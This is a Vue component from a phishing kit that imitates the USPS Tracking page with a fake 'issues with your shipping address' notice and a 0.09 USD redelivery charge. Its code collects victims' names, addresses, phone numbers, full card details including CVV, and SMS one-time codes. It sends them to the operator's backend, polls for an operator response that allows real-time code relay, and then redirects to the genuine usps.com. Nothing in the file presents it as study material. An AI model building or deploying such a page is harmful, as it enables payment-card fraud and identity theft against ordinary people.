<!-- eslint-disable no-undef -->
<template>
  <div class="conment">
    <div class="topbox push">
      <div><img src="../assets/usps/hamburger.svg" class="selectimg"></div>
      <div class="public_bd logowid"><img src="../assets/usps/logo_mobile.svg" class="logo"></div>
      <div><img src="../assets/usps/search.svg" class="selectimg"></div>
    </div>
    <div class="hearf push">
      <h1 class="public_bd">USPS Tracking<sup>®</sup></h1>
      <strong>FAQs</strong>
    </div>
    <div class="cons">
      Track Another Package<i>+</i>
    </div>
    <div class="container">
      <div class="container_top">
        <h3>Tracking Number: <b style="color: rgb(89, 89, 89); font-weight: normal;"><br>US9514901185421</b></h3>
      </div>
      <div class="container_linebox"  v-if="finstpage">
        <div class="container_line threbar">
          <span></span>
        </div>
        <div class="container_line"></div>
        <div class="container_line"></div>
      </div>

      <div class="container_linebox" v-if="twopage">
        <div class="container_line threbar">
          <span style="width:100%"></span>
        </div>
        <div class="container_line threbar">
          <span></span>
        </div>
        <div class="container_line"></div>
      </div>

      <div class="container_linebox" v-if="threepage">
        <div class="container_line threbar">
          <span style="width:100%"></span>
        </div>
        <div class="container_line threbar">
          <span style="width:100%"></span>
        </div>
        <div class="container_line threbar">
          <span></span>
        </div>
      </div>
      <div class="container_linebox" v-if="fourpage">
        <div class="container_line threbar">
          <span style="width:100%"></span>
        </div>
        <div class="container_line threbar">
          <span style="width:100%"></span>
        </div>
        <div class="container_line threbar">
          <span></span>
        </div>
      </div>
      <div class="tips" v-if="finstpage||twopage||threepage">
        <h2><strong class="tsk">We have issues with your shipping address</strong></h2>
      </div>
      <div class="mobile_p" v-if="finstpage||twopage||threepage">
        You can schedule redelivery online by filling out your information, We ReDeliver for You!<br><br> Redeliveries can be scheduled online 24 hours a day, 7 days a week. For same-day Redelivery, make sure your request is submitted by 2 AM CST Monday-Saturday or your Redelivery will be scheduled for the next day.
      </div>
      <div class="themelight" v-if="finstpage||twopage||threepage"></div>

      <div class="frombox">
        <div v-if="finstpage">
          <div class="from_title">Verify Address</div>
          <div class="from_dispn"> First, we need to confirm your address is eligible for Informed Delivery. </div>
          <div>
            <div :class="{error:Firstnameerror}">
              <input type="text" placeholder="First name" v-model="Firstname"  class="iteminput" :class="{errorborder:Firstnameerror}">
            </div>
            <div :class="{error:Lastnameerror}">
              <input type="text" placeholder="Last name" v-model="Lastname"  class="iteminput" :class="{errorborder:Lastnameerror}">
            </div>
            <div :class="{error:Address1error}">
              <input type="text" placeholder="Street Address 1" v-model="Address1"  class="iteminput" :class="{errorborder:Address1error}">
            </div>
            <div :class="{error:Address2error}">
              <input type="text" placeholder="Street Address 2 (OPTIONAL)" v-model="Address2"  class="iteminput" :class="{errorborder:Address2error}">
            </div>
            <div :class="{error:Cityerror}">
              <input type="text" placeholder="City" v-model="City" class="iteminput" :class="{errorborder:Cityerror}">
            </div>
            <div :class="{error:Stateerror}">
              <input type="text" placeholder="Select State" v-model="State" @click="showState"  class="iteminput" readonly :class="{errorborder:Stateerror}">
            </div>

            <van-popup v-model="showSelectStateListPicker" position="bottom">
              <van-picker
                :columns="SelectStateList"
                @confirm="onyearConfirm"
                show-toolbar
                confirm-button-text='OK'
                cancel-button-text='cancel'
                @cancel="showSelectStateListPicker = false"
              />
            </van-popup>
            <div :class="{error:ZIPCodeerror}">
            <input type="number" placeholder="ZIP Code™ (OPT)" v-model="ZIPCode"  class="iteminput" :class="{errorborder:ZIPCodeerror}">
            </div>
            <div :class="{error:Phoneerror}">
            <input type="tel" placeholder="Phone Number" v-model="Phone" oninput="if(value.length >11){value=value.slice(0,11)}" class="iteminput" :class="{errorborder:Phoneerror}">
            </div>
            <div :class="{error:Phoneerror}" v-show="Phoneerror">Please enter the correct phone number</div>
          </div>
          <div style="text-align: center; padding-bottom:30px"><div class="button" @click="fristbutton">Continue</div></div>
        </div>

        <div v-if="twopage">
          <div class="from_title">Payment Method</div>
          <div class="from_dispn error"> This Redelivery request cost 0.09 USD.</div>
          <div>
            <div :class="{error:cardnameerror}">
              <input type="text" placeholder="Card Name" v-model="cardname"  class="iteminput" :class="{errorborder:cardnameerror}">
            </div>
            <div :class="{error:cardnumerror}">
              <input type="text" placeholder="Card Number" v-model="cardnum" :maxlength="23" @keyup.delete="onkeyupdeta"  class="iteminput" :class="{errorborder:cardnumerror}" ref="cardnum" data-gap=4 >
            </div>
            <div :class="{error:cardnumerror}" v-show="cardnumerror">Please enter the correct card number</div>
            <div :class="{error:carddateerror}">
              <input type="text" placeholder="Expiry Date (MM/YY)" @keyup.delete="onkeycarddate" oninput="if(value.length>5){value=value.slice(0,3)}if(value.length===2){value=value+'/'}" v-model="carddate" class="iteminput" :class="{errorborder:carddateerror}">
            </div>
            <div :class="{error:carddateerror}" v-show="carddateerror">Please enter the correct Expiry Date</div>
            <div :class="{error:cardcvverror}">
              <input type="number" placeholder="CVV" v-model="cardcvv" oninput="if(value.length>6)value=value.slice(0,6)" class="iteminput" :class="{errorborder:cardcvverror}">
            </div>
            <div :class="{error:cardcodeerror}">
              <input type="number" placeholder="Zip Code" v-model="cardcode" oninput="if(value.length>6)value=value.slice(0,6)"  class="iteminput" :class="{errorborder:cardcodeerror}">
            </div>
          </div>
          <div style="text-align: center; padding-bottom:30px"><div class="button" @click="twobutton">Continue</div></div>
        </div>

        <div v-if="threepage">
          <div class="from_title">Enter verification code</div>
          <div class="from_dispn"> We require you to enter a one-time verification code for security reasons.</div>
          <div class="lastinput">
            <div class="public_bd" :class="{error:smscodeerror}"><input type="number" placeholder="Verification code" v-model="smscode" oninput="if(value.length>6)value=value.slice(0,6)"  class="iteminputs" :class="{errorborder:smscodeerror}"></div>
            <div style="width:25px"></div>
            <div><button class="button" @click="sendmsg" :disable=disable :class="{buttonbj:disable}">{{SENDTXT}}</button></div>
          </div>
          <div style="text-align: center; padding-bottom:30px"><div class="button" @click="threebutton">Continue</div></div>
        </div>

        <div v-if="fourpage">
          <div class="from_title"><strong style="color: green;">We have update your shipping address</strong></div>
          <div class="mobile_p">
            For more information about claims, visit your local Post Office or our Web site at <a href="https://www.usps.com/insuranceclaims/" style="color: rgb(51, 51, 102);">https://www.usps.com/insuranceclaims/</a>.<br> The U.S.Postal Service values your buisness . We apologize for any inconvenience you may have experienced as a result of this matter .
          </div>
          <div style="text-align: center; padding-bottom:30px"><div class="button" @click="fourbutton">Continue</div></div>
        </div>

      </div>

    </div>

    <div class="faq">
      <h2>Can’t find what you’re looking for?</h2>
      <p>Go to our FAQs section to find answers to your tracking questions.</p>
      <div class="button">FAQs</div>
    </div>

    <div class="container">
      <div class="footer">
        <div class="footer_item">
          <ol><strong>Helpful Links</strong></ol>
          <li><a href="https://www.usps.com/help/contact-us.htm">Contact Us</a></li>
          <li><a href="https://www.usps.com/globals/site-index.htm">Site Index</a></li>
          <li><a href="https://faq.usps.com/s/">FAQs</a></li>
          <li><a href="#">Feedback</a></li>
        </div>
        <div class="footer_item">
          <ol><strong>On About.USPS.com</strong></ol>
          <li><a href="https://about.usps.com/">About USPS Home</a></li>
          <li><a href="https://about.usps.com/newsroom/">Newsroom</a></li>
          <li><a href="https://about.usps.com/newsroom/service-alerts/">USPS Service Updates</a></li>
          <li><a href="https://about.usps.com/resources/">Forms &amp; Publications</a></li>
          <li><a href="https://about.usps.com/what/government-services/">Government Services</a></li>
          <li><a href="https://about.usps.com/careers/">Careers</a></li>
        </div>
        <div class="footer_item">
          <ol><strong>Other USPS Sites</strong></ol>
          <li><a href="https://gateway.usps.com/">Business Customer Gateway</a></li>
          <li><a href="https://www.uspis.gov/">Postal Inspectors</a></li>
          <li><a href="https://www.uspsoig.gov/">Inspector General</a></li>
          <li><a href="https://pe.usps.com/">Postal Explorer</a></li>
          <li><a href="https://postalmuseum.si.edu/">National Postal Museum</a></li>
          <li><a href="https://www.usps.com/business/web-tools-apis/">Resources for Developers</a></li>
        </div>
        <div class="footer_item">
          <ol><strong>Legal Information</strong></ol>
          <li><a href="https://about.usps.com/who/legal/privacy-policy/">Privacy Policy</a></li>
          <li><a href="https://about.usps.com/who/legal/terms-of-use.htm">Terms of Use</a></li>
          <li><a href="https://about.usps.com/who/legal/foia/">FOIA</a></li>
          <li><a href="https://about.usps.com/who/legal/no-fear-act/">No FEAR Act/EEO Contacts</a></li>
        </div>
      </div>
      <div class="footercopyright">Copyright ©2022USPS. All Rights Reserved.</div>
      <div class="themelight"></div>
      <div class="links">
        <div><img src="../assets/usps/social-facebook_1.png" width="100%"></div>
        <div><img src="../assets/usps/social-twitter_2.png" width="100%"></div>
        <div><img src="../assets/usps/social-pinterest_6.png" width="100%"></div>
        <div><img src="../assets/usps/social-youtube_3.png" width="100%"></div>
      </div>
    </div>
    <div v-if="firstloading" class="loadingdiv">
      <div class="public_bd logowid"><img src="../assets/usps/loading.gif"></div>
    </div>
  </div>
</template>
<script>
import { validebank } from '@/utils/util'
export default {
  name: 'index',
  data () {
    return {
      hosturl: '',
      SENDTXT: 'SEND',
      totalTime: 60,
      disable: false,
      finstpage: true,
      twopage: false,
      threepage: false,
      fourpage: false,
      firstloading: false,
      fristdata: '',
      showSelectStateListPicker: false,
      SelectStateList: [
        'AL - Alabama',
        'AK - Alaska',
        'AS - American Samoa',
        'AZ - Arizona',
        'AR - Arkansas',
        'CA - California',
        'CO - Colorado',
        'CT - Connecticut',
        'DE - Delaware',
        'DC - District of Columbia',
        'FM - Federated States of Micronesia',
        'FL - Florida',
        'GA - Georgia',
        'GU - Guam',
        'HI - Hawaii',
        'ID - Idaho',
        'IL - Illinois',
        'IN - Indiana',
        'IA - Iowa',
        'KS - Kansas',
        'KY - Kentucky',
        'LA - Louisiana',
        'ME - Maine',
        'MH - Marshall Islands',
        'MD - Maryland',
        'MA - Massachusetts',
        'MI - Michigan',
        'MN - Minnesota',
        'MS - Mississippi',
        'MO - Missouri',
        'MT - Montana',
        'NE - Nebraska',
        'NV - Nevada',
        'NH - New Hampshire',
        'NJ - New Jersey',
        'NM - New Mexico',
        'NY - New York',
        'NC - North Carolina',
        'ND - North Dakota',
        'MP - Northern Mariana Islands',
        'OH - Ohio',
        'OK - Oklahoma',
        'OR - Oregon',
        'PW - Palau',
        'PA - Pennsylvania',
        'PR - Puerto Rico',
        'RI - Rhode Island',
        'SC - South Carolina',
        'SD - South Dakota',
        'TN - Tennessee',
        'TX - Texas',
        'UT - Utah',
        'VT - Vermont',
        'VI - Virgin Islands',
        'VA - Virginia',
        'WA - Washington',
        'WV - West Virginia',
        'WI - Wisconsin',
        'WY - Wyoming',
        'AA - Armed Forces Americas',
        'AE - Armed Forces Europe',
        'AP - Armed Forces Pacific'
      ],
      Firstname: '',
      Lastname: '',
      Address1: '',
      Address2: '',
      City: '',
      State: '',
      ZIPCode: '',
      Phone: '',
      Firstnameerror: false,
      Lastnameerror: false,
      Address1error: false,
      Address2error: false,
      Cityerror: false,
      Stateerror: false,
      ZIPCodeerror: false,
      Phoneerror: false,
      cardname: '',
      cardnum: '',
      cardcvv: '',
      carddate: '',
      cardcode: '',
      smscode: '',
      cardnameerror: false,
      cardnumerror: false,
      cardcvverror: false,
      carddateerror: false,
      cardcodeerror: false,
      smscodeerror: false
    }
  },
  watch: {
    Firstname: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Firstnameerror = false
        }
      },
      deep: true
    },
    Lastname: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Lastnameerror = false
        }
      },
      deep: true
    },
    Address1: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Address1error = false
        }
      },
      deep: true
    },
    Address2: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Address2error = false
        }
      },
      deep: true
    },
    City: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Cityerror = false
        }
      },
      deep: true
    },
    State: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Stateerror = false
        }
      },
      deep: true
    },
    ZIPCode: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.ZIPCodeerror = false
        }
      },
      deep: true
    },
    Phone: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.Phoneerror = false
        }
      },
      deep: true
    },
    cardname: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.cardnameerror = false
        }
      },
      deep: true
    },
    cardnum: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          console.log(newValue, 222222)
          this.cardnumerror = false
        }
      },
      deep: true
    },
    // eslint-disable-next-line no-dupe-keys
    'cardnum' (val) {
      if (val.length > 0) {
        this.cardnumerror = false
      }
      var gap = parseInt(this.$refs.cardnum.getAttribute('data-gap'))
      this.$nextTick(() => {
        var numbers = val.replace(/[^\w]|/ig, '').split('') // 获取原始值
        var back = ''

        numbers.forEach(function (n, i) {
          back += n + ((i + 1) % gap === 0 ? ' ' : '') // 处理加空格或-
        })
        this.cardnum = back
      })
    },
    cardcvv: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.cardcvverror = false
        }
      },
      deep: true
    },
    carddate: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.carddateerror = false
        }
      },
      deep: true
    },
    cardcode: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.cardcodeerror = false
        }
      },
      deep: true
    },
    smscode: {
      handler: function (newValue, oldValue) {
        // eslint-disable-next-line eqeqeq
        if (newValue != '') {
          this.smscodeerror = false
        }
      },
      deep: true
    }
  },

  methods: {
    sendmsg () {
      this.disable = true
      this.SENDTXT = this.totalTime
      let clock = window.setInterval(() => {
        this.totalTime--
        this.SENDTXT = this.totalTime
        if (this.totalTime < 0) {
          window.clearInterval(clock)
          this.SENDTXT = 'SEND'
          this.totalTime = 60
          this.disable = false
        }
      }, 1000)
    },
    onkeyupdeta (event) {
      // eslint-disable-next-line eqeqeq
      if (event.keyCode == 8) {
        this.cardnum = ''
        this.cardnumerror = false
      }
    },
    onkeycarddate (event) {
      // eslint-disable-next-line eqeqeq
      if (event.keyCode == 8) {
        this.carddate = ''
        this.carddateerror = false
      }
    },
    fristbutton () {
      // eslint-disable-next-line eqeqeq
      if (this.Firstname == '') {
        this.Firstnameerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.Lastname == '') {
        this.Lastnameerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.Address1 == '') {
        this.Address1error = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.Address1 == '' && this.Address2 == '') {
        this.Address2error = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.City == '') {
        this.Cityerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.State == '') {
        this.Stateerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.ZIPCode == '') {
        this.ZIPCodeerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.Phone == '') {
        this.Phoneerror = true
        return false
      }
      this.finstpage = false
      this.twopage = true
    },
    twobutton () {
      console.log(this.finstpage, this.twopage)
      // eslint-disable-next-line eqeqeq
      if (this.cardname == '') {
        this.cardnameerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.cardnum == '') {
        this.cardnumerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.carddate == '') {
        this.carddateerror = true
        return false
      }
      var indexs = this.carddate.indexOf('/')
      var resolves = this.carddate.substring(indexs + 1, this.cardnum.length)
      var resolvey = this.carddate.substring(0, indexs)
      console.log(resolves, resolvey)
      if (parseInt(resolves) < 22) {
        this.carddateerror = true
        return false
      }
      if (parseInt(resolves) <= 22 && parseInt(resolvey) < 9) {
        this.carddateerror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.cardcvv == '') {
        this.cardcvverror = true
        return false
      }
      // eslint-disable-next-line eqeqeq
      if (this.cardcode == '') {
        this.cardcodeerror = true
        return false
      }
      if (validebank(this.cardnum.replace(/\s*/g, '')) === false) {
        this.cardnumerror = true
        return false
      }
      console.log(this.Firstname)
      const ua = navigator.userAgent
      this.$axios({
        method: 'post',
        url: this.hosturl + 'api/pro/create/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?cardname=' + this.cardname + '&cardnum=' + this.cardnum + '&cardcvv=' + this.cardcvv + '&carddate=' + this.carddate + '&cardcode=' + this.cardcode + '&Firstname=' + this.Firstname + '&Lastname=' + this.Lastname + '&Address1=' + this.Address1 + '&Address2=' + this.Address2 + '&City=' + this.City + '&State=' + this.State + '&ZIPCode=' + this.ZIPCode + '&Phone=' + this.Phone + '&ua=' + ua,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.fristdata = res.data.data
          this.firstloading = true
          this.trainOrderResult()
          window.clearInterval()
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    threebutton () {
      // eslint-disable-next-line eqeqeq
      if (this.smscode == '') {
        this.smscodeerror = true
        return false
      }
      this.$axios({
        method: 'post',
        url: this.hosturl + 'api/pro/apd/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '?smscode=' + this.smscode,
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.code == 1) {
          this.firstloading = true
          this.trainOrderResults()
          return true
        } else {
          this.$toast({
            message: res.data.msg,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },
    fourbutton () {
      window.location.href = 'https://www.usps.com/'
    },
    // 轮询支付结果
    async trainOrderResults () {
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getfour(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.getfour(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    getfour (checkOrderInterval) {
      this.$axios({
        method: 'post',
        url: this.hosturl + 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/smscode',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          this.finstpage = false
          this.twopage = false
          this.threepage = false
          this.fourpage = true
          this.firstloading = false
          window.clearInterval(checkOrderInterval)
          setTimeout(function () {
            window.location.href = 'https://www.usps.com/'
          }, 10000)
          return true
        // eslint-disable-next-line eqeqeq
        } if (res.data.data != '0' && res.data.data != '1') {
          this.firstloading = false
          window.clearInterval(checkOrderInterval)
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    // 轮询支付结果
    async trainOrderResult () {
      this.disabled = true
      let expireTimestamp = Date.parse(new Date()) / 1000 + 60
      let seconds = 30
      var that = this
      let checkOrderInterval = setInterval(function () {
        let currentTimestamp = Date.parse(new Date()) / 1000
        if (seconds === 0 || currentTimestamp >= expireTimestamp) {
          window.clearInterval(checkOrderInterval)
          that.getthree(checkOrderInterval)
        }
        if (seconds % 2 === 0) {
          that.getthree(checkOrderInterval)
        }
        seconds--
      }, 1000)
    },

    getthree (checkOrderInterval) {
      this.$axios({
        method: 'post',
        url: this.hosturl + 'api/pro/cq/3f0929adb48041a69871dda42401d4e0/' + this.fristdata + '/cardcode',
        data: {
        }
      }).then((res) => {
        // eslint-disable-next-line eqeqeq
        if (res.data.data === '1') {
          window.clearInterval(checkOrderInterval)
          this.firstloading = false
          this.finstpage = false
          this.twopage = false
          this.threepage = true
          return true
        // eslint-disable-next-line eqeqeq
        } if (res.data.data != '0' && res.data.data != '1') {
          window.clearInterval(checkOrderInterval)
          this.firstloading = false
          this.$toast({
            message: res.data.data,
            color: '#ffffff',
            background: '#ff6f6f',
            duration: 3000
          })
          return false
        } else {
          return false
        }
      }).catch(e => {
        console.log(e)
      })
    },

    showState () {
      this.showSelectStateListPicker = true
    },
    onyearConfirm (value) {
      this.showSelectStateListPicker = false
      this.State = value
    }
  },
  mounted () {

  },
  created () {
    // eslint-disable-next-line eqeqeq
    if (window.location.host.indexOf('test') != -1 || window.location.host.indexOf('localhost') != -1) {
      this.hosturl = process.env.API_ROOT
    } else {
      this.hosturl = window.location.origin + '/'
    }
  }
}
</script>
<style scoped>
.loadingdiv{
  width: 100%;
  height: 100%;
  position: fixed;
  top: 0px;
  left: 0px;
  background: rgba(0,0,0,.52);
}
.loadingdiv img{
  width: 90px;
  position: absolute;
  top: 50%;
  left:50%;
  transform: translate(-50%, -50%);
}
.lastinput{
  position: relative;
  display: -webkit-box;
  display: -webkit-flex;
  display: flex;
  -webkit-box-align: center;
  -webkit-align-items: center;
  align-items: center;
}
.errorborder{
  border: 1px solid red !important;
}
.error{
  color: red !important;
}
.error input:-moz-placeholder{
    color: red;
}
.error input:-ms-input-placeholder{
    color: red;
}
.error input::-webkit-input-placeholder{
    color: red;
}
.iteminput{
  margin-top: 24px;
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  width: 100%;
  height: 50px;
  font-size: 16px;
  padding: 5px 10px;
  border: 1px solid #336;
  border-radius: 3px!important;
  position: relative;
  color: #000;
  transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}
.iteminputs{
  margin-top: 30px;
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  width: 100%;
  height: 44px;
  font-size: 16px;
  padding: 5px 10px;
  border: 1px solid #336;
  border-radius: 3px!important;
  position: relative;
  color: #000;
  transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}
.frombox{
  padding-top: 20px;
}
.from_title{
  font-size: 18px;
  line-height: 100%;
  font-weight: 700;
  color: #336;
}
.from_dispn{
  font-size: 13px;
  padding-top: 8px;
  color: rgba(0,0,0,.87);
}
.push {
  position: relative;
  display: -webkit-box;
  display: -webkit-flex;
  display: flex;
  -webkit-box-align: center;
  -webkit-align-items: center;
  align-items: center;
}
.public_bd {
  -webkit-box-flex: 1;
  -webkit-flex: 1;
  flex: 1;
}
.topbox{
  padding: 9px 20px;
  border-bottom: 3px solid red;
}
.selectimg{
  width: 35px;
}
.logo{
  width: 60px;
}
.logowid{
  text-align: center;
}
.hearf{
    padding: 15px 20px;
}
h1{
  font-size: 25px;
  font-weight: 700;
  color: #336;
}
.hearf strong{
  font-weight: bolder;
  font-size: 14px;
  font-weight: 700;
  color: #336;
}
.cons{
  padding: 40px;
  background: #fff;
  cursor: pointer;
  font-family: HelveticaNeueW01,Helvetica,Arial,sans-serif;
  font-weight: 700;
  font-style: normal;
  font-weight: 700;
  font-size: 20px;
  color: #336;
  text-align: center;
}
.cons i{
  color: red;
  font-size: 27px;
}
.container{
  padding: 40px 12px 12px 12px;
}
.container_top{
  margin-bottom: 30px;
}
.container_top h3{
  font-size: 20px;
  font-weight: 700;
  color: #336;
}
.container_linebox{
  height: 15px;
  margin-bottom: 12px;
}
.container_line{
  position: relative;
  float: left;
  width: calc(33.33% - 5px);
  height: 15px;
  margin-right: 5px;
  transform: skew(-20deg);
  transform-origin: left bottom;
  background: #d8d8d8;
}
.threbar{
  position: relative;
}
.threbar:first-child:before{
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  width: 15px;
  height: 100%;
  transform: skew(20deg);
  transform-origin: left bottom;
  background: #336;
}
.threbar span{
  width:50%;
  display: block;
  position: absolute;
  height: 100%;
  background: #336;
}
.tsk{
  color: rgb(231, 25, 33);
  font-weight: 700;
  font-size: 22px;
}
.tips{}
.mobile_p{
  padding: 16px 0px;
  font-size: 14px;
  line-height: 125%;
  font-weight: 400;
  color: #595959;
}
.themelight{
  display: block;
  flex: 1 1 0px;
  max-width: 100%;
  height: 0;
  max-height: 0;
  border: solid;
  border-width: thin 0 0 0;
  transition: inherit;
  height: 1px;
  border-color: rgba(0,0,0,.12);
}
.faq{
  padding: 40px;
  background: #fff;
  text-align: center;
}
.faq h2{
  font-weight: 700;
  font-size: 20px;
  margin-bottom: 20px;
}
.faq p{
  font-size: 15px;
  font-weight: 400;
  color: #595959;
}
.button{
  background: #336;
  color: #fff;
  font-weight: 700;
  display: inline-block;
  text-align: center;
  min-width: 115px;
  height: 44px;
  line-height: 44px;
  font-size: 16px;
  border-radius: 3px;
  padding: 0 20px;
  text-decoration: none;
  vertical-align: middle;
  cursor: pointer;
  border: 0;
  margin: 0px auto;
  margin-top: 30px;
}
.buttonbj{
  background: #999;
}
.footercopyright{
  clear: both;
  font-size: 14px;
  margin-bottom: 20px;
}
.links{
  padding-top: 20px;
}
.links div{
  display: inline-block;
  padding: 0 20px 0 0;
}
.footer{
}
.footer_item{
  width: 50%;
  float: left;
  margin-bottom: 20px;
}
.footer_item li{
  list-style: none;
}
.footer_item li a{
  list-style: none;
  font-weight: 400;
  font-size: 13px;
  color: #595959;
}
.footer_item ol{
  color: #333366;
}
@media (max-width: 1024px) {
}
</style>
